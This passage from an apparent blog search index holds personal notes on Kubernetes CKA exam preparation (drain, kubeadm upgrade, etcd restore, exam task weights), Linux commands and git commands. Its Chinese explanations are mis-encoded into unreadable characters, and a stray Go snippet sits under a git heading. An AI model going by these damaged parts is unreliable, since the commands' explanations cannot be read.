-owide&quot;</span><br><span class="hljs-built_in">alias</span> kg=<span class="hljs-string">&quot;kubectl get -owide &quot;</span><br><span class="hljs-built_in">alias</span> kd=<span class="hljs-string">&quot;kubectl delete &quot;</span><br><span class="hljs-built_in">alias</span> kaf=<span class="hljs-string">&quot;kubectl apply -f &quot;</span><br><span class="hljs-built_in">alias</span> kdf=<span class="hljs-string">&quot;kubectl delete -f &quot;</span><br><span class="hljs-comment"># source ~/.bahsrc</span><br><br></code></pre></td></tr></table></figure><h3 id="k8så‘½ä»¤"><a href="#k8så‘½ä»¤" class="headerlink" title="k8så‘½ä»¤"></a>k8så‘½ä»¤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment"># æ¸…ç©ºæŸä¸€ä¸ªèŠ‚ç‚¹ä¸Šçš„pod</span><br>kubectl cordon xxx<br>kubectl drain xxx --ignore-daemonsets<br>kubectl drain xxx --ignore-daemonsets --delete-emptydir-data --force <span class="hljs-comment"># æŠ¥é”™çš„è¯å¯ä»¥åŠ ä¸Š</span><br><br><br><span class="hljs-comment"># kubeadmå‡çº§masterèŠ‚ç‚¹</span><br><span class="hljs-comment">## 01.æ¸…ç©ºå‡çº§çš„èŠ‚ç‚¹</span><br>kubectl cordon xxx<br>kubectl drain xxx --ignore-daemonsets <br><span class="hljs-comment">## 02.å‡çº§ä¸»æœºå®‰è£…åŒ…</span><br>apt-get upgrade<br><span class="hljs-comment">## 03.å‡çº§k8sç›¸å…³ç»„ä»¶</span><br>apt-mark unhold kubeadm kubelet kubectl<br>apt-get install -y kubeadm=1.22.4-00 kubelet=1.22.4-00 kubectl=1.22.4-00<br>apt-mark hold kubeadm kubelet kubectl<br><span class="hljs-comment">## 04.å‡çº§é›†ç¾¤</span><br>kubeadm upgrade plan<br>kubeadm upgrade apply v1.22.4 --etcd-upgrade=<span class="hljs-literal">false</span><br><span class="hljs-comment">## 05.é‡å¯kubelet</span><br>systemctl daemon-reload<br>systemctl restart kubelet<br><span class="hljs-comment">## 06.å–æ¶ˆèŠ‚ç‚¹çš„ä¸å¯è°ƒåº¦</span><br>kubectl uncordon xxx<br><span class="hljs-comment">## 07.æŸ¥çœ‹èŠ‚ç‚¹çŠ¶æ€ä»¥åŠç‰ˆæœ¬</span><br>kubectl get node<br><br><br><span class="hljs-comment"># etcdå¤‡ä»½è¿˜åŸ</span><br><span class="hljs-comment">## 01.å¤‡ä»½</span><br>ETCDCTL_API=3 etcdctl --endpoints=https://127.0.0.1:2379 --cacert=xxx --cert=xxx --key=xxx snapshot save xxx.db<br><span class="hljs-comment">## 02.ç§»é™¤etcdå’Œapi</span><br><span class="hljs-built_in">mv</span> /etc/kubernetes/manifests /etc/kubernetes/manifests.bak<br><span class="hljs-comment">## 03.å¤‡ä»½åŸæ¥etcdæ–‡ä»¶å¤¹</span><br><span class="hljs-built_in">mv</span> /var/lib/etcd /var/lib/etcd.bak<br><span class="hljs-comment">## 04.etcdè¿˜åŸ</span><br>ETCDCTL_API=3 etcdctl --endpoints=https://127.0.0.1:2379 --cacert=xxx --cert=xxx --key=xxx snapshot restore xxx.db --data-dir=/var/lib/etcd<br><span class="hljs-comment">## 05.ç§»å›é™æ€pod</span><br><span class="hljs-built_in">mv</span> /etc/kubernetes/manifests.bak /etc/kubernetes/manifests<br><span class="hljs-comment">## 06.éªŒè¯é›†ç¾¤èµ„æºçŠ¶æ€</span><br>kubectl get node<br>kubectl get pod -A<br><br><br>kubectl label ns my-app name=my-app<br>kubetcl get ns --show-labels<br><br><span class="hljs-comment"># svc</span><br>apiVersion:<br>kind: Deployment<br>metadata:<br>  name:<br>spec:<br>  template:<br>    spec:<br>      containers:<br>      - image: xxx<br>        name: nginx<br>        ports:<br>        - name: http<br>          containerPort: 80<br>          protocol: TCP<br>kubectl expose deployment xxx -n xxx --name xxx --port xxx --target-port xxx --<span class="hljs-built_in">type</span>=ClusterIP/NodePort/LoadBalancer<br><br><br>kubectl get deployment -owide  <span class="hljs-comment">#æ‰¾åˆ°SELECTORä¸‹é¢çš„å†…å®¹(app=nginx)</span><br>kubectl get pod -l app=nginx<br><br>kubectl scale deployment xxx --replicas=3<br><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªpodï¼Œé•œåƒnginxï¼Œè°ƒåº¦podåˆ°disk=ssdçš„èŠ‚ç‚¹</span><br><span class="hljs-comment">## 01.ä½¿ç”¨å‘½ä»¤åˆ›å»ºä¸€ä¸ªpodçš„æ¨¡æ¿ï¼Œæ¯”ä»å®˜ç½‘æ‰¾å¿«å¾ˆå¤š</span><br>kubectl run pod-test --image=nginx --dry-run=client -oyaml &gt; 11.yaml<br><span class="hljs-comment">## 02.æ›´æ”¹podçš„æ¨¡æ¿</span><br>apiVersion: v1<br>kind: Pod<br>metadata:<br>  name: pod-test<br>spec:<br>  containers:<br>  - image: nginx<br>    name: pod-test<br>  nodeSelector:<br>    disk: ssd<br><br><br><span class="hljs-comment"># è®°å½•pvcçš„æ›´æ”¹</span><br>kubectl edit pvc xxx --record<br>kubectl edit pvc xxx --save-config<br><br><br><span class="hljs-comment"># ç»Ÿè®¡readyçš„nodeæ•°é‡</span><br>kubectl describe node <br>grep -i <span class="hljs-comment"># å¿½ç•¥å¤§å°å†™</span><br>grep -v <span class="hljs-comment"># æ’é™¤åœ¨å¤–</span><br>grep -c <span class="hljs-comment"># ç»Ÿè®¡æŸ¥å‡ºæ¥çš„æ¡æ•°</span><br><br><br><span class="hljs-comment"># æŸ¥çœ‹cpuä½¿ç”¨ç‡æœ€é«˜çš„pod</span><br>kubectl top pod -A -l name=cpu-loader --sort-by=<span class="hljs-string">&quot;cpu&quot;</span><br><br><br><span class="hljs-comment"># å¼ºåˆ¶åˆ é™¤pod(è¡¥å……)</span><br>kubectl delete pod xxx -n xxx --grace-period=0 --force<br></code></pre></td></tr></table></figure><h3 id="å‘½ä»¤è¯¦ç»†è¾“å‡º"><a href="#å‘½ä»¤è¯¦ç»†è¾“å‡º" class="headerlink" title="å‘½ä»¤è¯¦ç»†è¾“å‡º"></a>å‘½ä»¤è¯¦ç»†è¾“å‡º</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># kubectl run pod-test --image=nginx --dry-run=client -oyaml</span><br>apiVersion: v1<br>kind: Pod<br>metadata:<br>  creationTimestamp: null<br>  labels:<br>    run: pod-test<br>  name: pod-test<br>spec:<br>  containers:<br>  - image: nginx<br>    name: pod-test<br>    resources: &#123;&#125;<br>  dnsPolicy: ClusterFirst<br>  restartPolicy: Always<br>status: &#123;&#125;<br></code></pre></td></tr></table></figure><h2 id="é¢˜ç›®åˆ†å€¼å æ¯”"><a href="#é¢˜ç›®åˆ†å€¼å æ¯”" class="headerlink" title="é¢˜ç›®åˆ†å€¼å æ¯”"></a>é¢˜ç›®åˆ†å€¼å æ¯”</h2><p>ç¬¬1é¢˜ RBACæˆæƒ(4%)<br>ç¬¬2é¢˜ èŠ‚ç‚¹è®¾ç½®ä¸å¯ç”¨(4%)<br>ç¬¬3é¢˜ å‡çº§k8sç‰ˆæœ¬(7%)<br>ç¬¬4é¢˜ etcdå¤‡ä»½ä¸æ¢å¤(7%)<br>ç¬¬5é¢˜ ç½‘ç»œç­–ç•¥(7%)<br>ç¬¬6é¢˜ svcæš´éœ²åº”ç”¨(7%)<br>ç¬¬7é¢˜ ingress(7%)<br>ç¬¬8é¢˜ æ‰©å®¹podæ•°é‡(4%)<br>ç¬¬9é¢˜ nodeSelector(4%)<br>ç¬¬10é¢˜ ç»Ÿè®¡å‡†å¤‡å°±ç»ªèŠ‚ç‚¹æ•°é‡(4%)<br>ç¬¬11é¢˜ Pod é…ç½®å¤šå®¹å™¨(4%)<br>ç¬¬12é¢˜ åˆ›å»º PV(4%)<br>ç¬¬13é¢˜ Pod ä½¿ç”¨ PVC(7%)<br>ç¬¬14é¢˜ è·å– Pod é”™è¯¯æ—¥å¿—(5%)<br>ç¬¬15é¢˜ ç»™ Pod å¢åŠ ä¸€ä¸ªå®¹å™¨ï¼ˆè¾¹è½¦ï¼‰(7%)<br>ç¬¬16é¢˜ ç»Ÿè®¡ä½¿ç”¨ CPU æœ€é«˜çš„ Pod(5%)<br>ç¬¬17é¢˜ èŠ‚ç‚¹ NotReady å¤„ç†(13%)</p><h2 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h2><p>You must return to the base node (hostname node-1) after completing each task.</p><p>For your convenience, all environments, in other words, the base system and the cluster nodes, have the following additional command-line tools pre-installed and pre-configured:</p><ul><li><code>kubectl</code> with <code>k</code>alias and Bash autocompletion</li><li><code>jq</code> for YAML&#x2F;JSON processing</li><li><code>tmux</code> for terminal multiplexing</li><li><code>curl</code> and <code>wget</code> for testing web services</li><li><code>man</code> and man pages for further documentation</li></ul><p>è‡ªåŠ¨è¡¥å…¨æœ‰é—®é¢˜<br>deploymentå’Œsvcé‚£å— éœ€è¦æ³¨æ„è¿™ä¸¤ä¸ªçš„SELECTORæ˜¯å¦ä¸€è‡´ï¼Œsvcè¿™å—å¯èƒ½æ˜¯noneï¼Œéœ€è¦è°ƒæ•´ä¸€ä¸‹<br>ingressè¿™å—ï¼Œå¦‚æœingressæ²¡æœ‰ipï¼Œéœ€è¦æ£€æŸ¥helloæœåŠ¡çš„typeæ˜¯å¦æ˜¯ClusterIPï¼Œä¸æ˜¯çš„è¯éœ€è¦ä¿®æ”¹</p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
    <tags>
      
      <tag>k8s</tag>
      
      <tag>cka</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linuxå¸¸ç”¨å‘½ä»¤</title>
    <link href="/2022/12/15/linux/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/12/15/linux/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>nc<br><br>curl xxx -I<br><br> <br><br>systemctl is-enabled xxx<br><br><span class="hljs-comment">## 20221218</span><br>lsof -w |<span class="hljs-built_in">wc</span> -l<br>pkill fluentbit<br><br><br>grep xxx  ./  r<br><br><br>sqlite3 xx.db<br><br>.headers on<br>.tables<br><br><br>å­¦ä¹ ä¸€ä¸‹esçš„è¯­æ³•<br>paas-xxx : xxx* and xxx<br>paas-xxx : <span class="hljs-string">&quot;xxx&quot;</span>  åŠ ä¸ŠåŒå¼•å· ç²¾ç¡®åŒ¹é…ï¼Ÿï¼ŸæŸ¥æŸ¥<br>podccc.keyword: /var/log<br><br><br>openssl x509 -<span class="hljs-keyword">in</span> cacert.pem -noout -text<br>openssl x509 -<span class="hljs-keyword">in</span> cacert.pem -noout -text<br><br><br>docker <span class="hljs-built_in">history</span> 10.111.xxx.xxx/xxx/xxx<br><br><br><br><br><br><br>lvcreateÂ Â -LÂ 200GÂ -nÂ lv_dataÂ datavg  <br>mkfs.xfsÂ Â -fÂ /dev/mapper/datavg-lv_data  <br>  <br><span class="hljs-built_in">mkdir</span>Â /osbak  <br>mountÂ Â /dev/mapper/datavg-lv_dataÂ /osbak  <br><span class="hljs-built_in">mkdir</span>Â -pÂ /osbak/rootÂ /osbak/homeÂ /osbak/bin  <br><span class="hljs-built_in">cp</span>Â -arÂ /rootÂ Â /osbak/  <br><span class="hljs-built_in">cp</span>Â -arÂ /homeÂ Â /osbak/  <br><span class="hljs-built_in">cp</span>Â -arÂ /usr/local/binÂ /osbak<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€gitã€‘gitå¸¸ç”¨å‘½ä»¤</title>
    <link href="/2022/12/15/git/%E3%80%90git%E3%80%91git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/12/15/git/%E3%80%90git%E3%80%91git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h2 id="æ‹‰å–è¿œç¨‹åˆ†æ”¯å¹¶åˆ›å»ºæœ¬åœ°åˆ†æ”¯"><a href="#æ‹‰å–è¿œç¨‹åˆ†æ”¯å¹¶åˆ›å»ºæœ¬åœ°åˆ†æ”¯" class="headerlink" title="æ‹‰å–è¿œç¨‹åˆ†æ”¯å¹¶åˆ›å»ºæœ¬åœ°åˆ†æ”¯"></a>æ‹‰å–è¿œç¨‹åˆ†æ”¯å¹¶åˆ›å»ºæœ¬åœ°åˆ†æ”¯</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 660">Â  Â  Â  &#125; else &#123;<br><br>Â  Â  Â  Â  listener.Status.Reason = &quot;&quot;<br><br>Â  Â  Â  Â  logger.Info(msg + &quot; GetLoadBalancer ok&quot;, &quot;listener&quot;, key, &quot;lb id&quot;, listener.Spec.LoadbalancerId)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ä½¿ç”¨è¯¥æ–¹å¼ä¼šåœ¨æœ¬åœ°æ–°å»ºåˆ†æ”¯xï¼Œå¹¶è‡ªåŠ¨åˆ‡æ¢åˆ°è¯¥æœ¬åœ°åˆ†æ”¯x</span><br>git checkout -b æœ¬åœ°åˆ†æ”¯åx origin/è¿œç¨‹åˆ†æ”¯åx<br>git checkout -b master origin/master<br><br><span class="hljs-comment"># devåˆå¹¶åˆ°master</span><br>å¤„äºmasteråˆ†æ”¯<br>git merge origin/dev  <span class="hljs-comment"># mergeåˆ°æœ¬åœ°çš„master</span><br>git push <br><br><span class="hljs-comment"># è¿œç¨‹æ–°å»ºäº†ä¸€ä¸ªåˆ†æ”¯featureï¼Œæƒ³åœ¨æœ¬åœ°ä¹Ÿå»ºä¸€ä¸ªfeatureåˆ†æ”¯ï¼Œä½†æ˜¯åœ¨æœ¬åœ°git branch -açš„æ—¶å€™å‘ç°æ²¡æœ‰è¿™ä¸ªè¿œç¨‹çš„origin/featureåˆ†æ”¯ï¼Œæ€ä¹ˆåŠï¼Ÿ</span><br>1.é¦–å…ˆå°†æŸä¸ªè¿œç¨‹ä¸»æœºçš„æ›´æ–°ï¼Œå…¨éƒ¨å–å›æœ¬åœ°ï¼šgit fetch<br>2.å†æ¬¡æŸ¥çœ‹è¿œç¨‹åˆ†æ”¯ï¼šgit branch -a å‘ç°è¿œç¨‹çš„åˆ†æ”¯å·²ç»å¯ä»¥çœ‹è§äº†ã€‚<br>3.ç„¶åæ‹‰å–è¿œç¨‹åˆ†æ”¯åˆ°æœ¬åœ°ï¼šgit checkout -b è¿œç¨‹åˆ†æ”¯å origin/è¿œç¨‹åˆ†æ”¯å<br><br><br><span class="hljs-comment"># gitå¼ºåˆ¶æäº¤æœ¬åœ°åˆ†æ”¯è¦†ç›–è¿œç¨‹åˆ†æ”¯</span><br>git push origin åˆ†æ”¯å --force<br><br><br><span class="hljs-comment"># Gitåˆ›å»ºè¿œç¨‹åˆ†æ”¯</span><br>å‡è®¾å½“å‰åˆ†æ”¯ä¸ºmasterï¼Œéœ€è¦åˆ›å»ºçš„åˆ†æ”¯æ˜¯my-test<br>git checkout -b my-test  //åœ¨å½“å‰åˆ†æ”¯ä¸‹åˆ›å»ºmy-testçš„æœ¬åœ°åˆ†æ”¯åˆ†æ”¯<br>git push origin my-test  //å°†my-teståˆ†æ”¯æ¨é€åˆ°è¿œç¨‹<br>git branch --set-upstream-to=origin/my-test //å°†æœ¬åœ°åˆ†æ”¯my-testå…³è”åˆ°è¿œç¨‹åˆ†æ”¯my-testä¸Š   <br>git branch -a //æŸ¥çœ‹è¿œç¨‹åˆ†æ”¯ <br><br><br><br><br></code></pre></td></tr></table></figure><h3 id="gitæ‰“tag"><a href="#gitæ‰“tag" class="headerlink" title="gitæ‰“tag"></a>gitæ‰“tag</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment"># æ‰“æ ‡ç­¾</span><br>git tag -a v1.4 -m <span class="hljs-string">&quot;my version 1.4&quot;</span><br>git tag v1.4-lw<br>git tag<br>git show v1.4  <span class="hljs-comment"># git showÂ å‘½ä»¤å¯ä»¥çœ‹åˆ°æ ‡ç­¾ä¿¡æ¯å’Œä¸ä¹‹å¯¹åº”çš„æäº¤ä¿¡æ¯</span><br>git push origin v1.5 <span class="hljs-comment">#å°†æœ¬åœ°v1.5çš„tagæ¨é€åˆ°è¿œç«¯æœåŠ¡å™¨</span><br><br></code></pre></td></tr></table></figure><h3 id="gitæ’¤å›ä¸Šæ¬¡commit"><a href="#gitæ’¤å›ä¸Šæ¬¡commit" class="headerlink" title="gitæ’¤å›ä¸Šæ¬¡commit"></a>gitæ’¤å›ä¸Šæ¬¡commit</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git reset --soft HEAD^      ä»…ä»…æ˜¯æ’¤å›commitæ“ä½œï¼Œå†™çš„ä»£ç ä»ç„¶ä¿ç•™ã€‚<br>= git reset --soft HEAD~1<br>git reset --soft HEAD~2     å¦‚æœè¿›è¡Œäº†2æ¬¡commitï¼Œæƒ³éƒ½æ’¤å›<br></code></pre></td></tr></table></figure><h3 id="gitæ’¤å›ä¸Šæ¬¡push"><a href="#gitæ’¤å›ä¸Šæ¬¡push" class="headerlink" title="gitæ’¤å›ä¸Šæ¬¡push"></a>gitæ’¤å›ä¸Šæ¬¡push</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">å¯ä»¥ç”¨git <span class="hljs-built_in">log</span> æŸ¥çœ‹ä½ è¦å›åˆ°çš„é‚£ä¸ªç‰ˆæœ¬<br><br>æ¥ç€ç”¨<br>git reset --hard HEAD^ å›é€€åˆ°ä¸Šä¸ªç‰ˆæœ¬<br>git reset --hard commit_id é€€åˆ°/è¿›åˆ° æŒ‡å®šcommit_id<br><br>æœ€åå°†æœ¬åœ°çš„ä¿®æ”¹æäº¤åˆ°è¿œç¨‹<br>git push origin HEAD --force<br><br><span class="hljs-comment">## æ³¨æ„ï¼Œè¿™æ ·å­ä¿®æ”¹ï¼Œä¹‹å‰commitçš„ä¿¡æ¯å°±æ²¡äº†ï¼Œæœ¬åœ°çš„ä¹Ÿæ²¡äº†ï¼Œéœ€è¦æå‰ä¿å­˜ç›¸å…³ä¿¡æ¯</span><br><br></code></pre></td></tr></table></figure><h2 id="gitå»ºç«‹æœ¬åœ°ä»“åº“å¹¶æ¨é€åˆ°è¿œç¨‹"><a href="#gitå»ºç«‹æœ¬åœ°ä»“åº“å¹¶æ¨é€åˆ°è¿œç¨‹" class="headerlink" title="gitå»ºç«‹æœ¬åœ°ä»“åº“å¹¶æ¨é€åˆ°è¿œç¨‹"></a>gitå»ºç«‹æœ¬åœ°ä»“åº“å¹¶æ¨é€åˆ°è¿œç¨‹</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. githubæ–°å»ºä¸€ä¸ªä»“åº“<br><br>1.  **åœ¨æœ¬åœ°<span class="hljs-built_in">test</span> é¡¹ç›®ä¸­ä½¿ç”¨ git init æŠŠå…¶å˜æˆgitå¯ä»¥ç®¡ç†çš„ä»“åº“**ï¼Œ  <br>    æ‰“å¼€<span class="hljs-built_in">test</span>é¡¹ç›®æ–‡ä»¶å¤¹ï¼Œå³é”®é€‰æ‹©git bashå‘½ä»¤è¡Œå·¥å…·ï¼Œè¾“å…¥ï¼š  <br>    **git init**  <br>    å°±å¯ä»¥æŠŠæ­¤æ—¶çš„<span class="hljs-built_in">test</span>é¡¹ç›®å˜æˆgitå¯ä»¥ç®¡ç†çš„ä»“åº“<br>    <br>2.  **æ·»åŠ æ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰æ–‡ä»¶åˆ°æš‚å­˜åŒº**  <br>    å¯ä»¥ç”¨å‘½ä»¤ git add â€˜â€™filenameâ€˜â€™ æ·»åŠ **å•ä¸ªæ–‡ä»¶**  <br>    ä¹Ÿå¯ä»¥ç”¨å‘½ä»¤Â **git add . æŠŠ**æ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰æ–‡ä»¶æ·»åŠ åˆ°ç¼“å­˜åŒºï¼ˆæ³¨æ„addå’Œ.ä¹‹é—´æœ‰ä¸ªç©ºæ ¼ï¼‰<br>    <br>3.  **æŠŠæ–‡ä»¶æäº¤åˆ°ä»“åº“ ï¼›**  <br>    ä½¿ç”¨å‘½ä»¤è¡Œï¼šÂ **git-commit -m â€œæäº¤æè¿°â€**<br>    <br>4.  ****å…³è”è¿œç¨‹ä»“åº“**Â **  <br>    ä½¿ç”¨å‘½ä»¤è¡Œï¼šgit remote add origin ä½ çš„è¿œç¨‹ä»“åº“urlåœ°å€**Â ï¼›<br>    <br>5.  **è·å–è¿œç¨‹åº“ä¸æœ¬åœ°åŒæ­¥ï¼ˆè¿œç¨‹ä»“åº“ä¸ä¸ºç©ºéœ€è¦è¿™ä¸€æ­¥ï¼‰**  <br>    ä½¿ç”¨å‘½ä»¤è¡Œï¼š**git pull --rebase origin master**<br>    <br>6.  **æŠŠæœ¬åœ°å†…å®¹æ¨é€åˆ°è¿œç¨‹åº“**Â ã€‚  <br>    ä½¿ç”¨å‘½ä»¤è¡Œï¼š**git push -u origin master**<br><br></code></pre></td></tr></table></figure><h2 id="å¼ºåˆ¶åˆ é™¤æœ¬åœ°åˆ†æ”¯å’Œè¿œç¨‹åˆ†æ”¯"><a href="#å¼ºåˆ¶åˆ é™¤æœ¬åœ°åˆ†æ”¯å’Œè¿œç¨‹åˆ†æ”¯" class="headerlink" title="å¼ºåˆ¶åˆ é™¤æœ¬åœ°åˆ†æ”¯å’Œè¿œç¨‹åˆ†æ”¯"></a>å¼ºåˆ¶åˆ é™¤æœ¬åœ°åˆ†æ”¯å’Œè¿œç¨‹åˆ†æ”¯</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">1 å…ˆåˆ‡æ¢åˆ°åˆ«çš„åˆ†æ”¯: git checkout dev_20180927<br><br>2 åˆ é™¤æœ¬åœ°åˆ†æ”¯ï¼š git branch -d dev_20181018<br><br>3 å¦‚æœåˆ é™¤ä¸äº†å¯ä»¥å¼ºåˆ¶åˆ é™¤ï¼Œgit branch -D dev_20181018<br><br>4 æœ‰å¿…è¦çš„æƒ…å†µä¸‹ï¼Œåˆ é™¤è¿œç¨‹åˆ†æ”¯ï¼šgit push origin --delete dev_20181018<br><br>  <br>  <br>ä½œè€…ï¼šè¿½é€ç¹æ˜Ÿçš„é˜¿å¿   <br>é“¾æ¥ï¼šhttps://www.jianshu.com/p/9fbe77ad1058  <br>æ¥æºï¼šç®€ä¹¦  <br>è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚<br></code></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 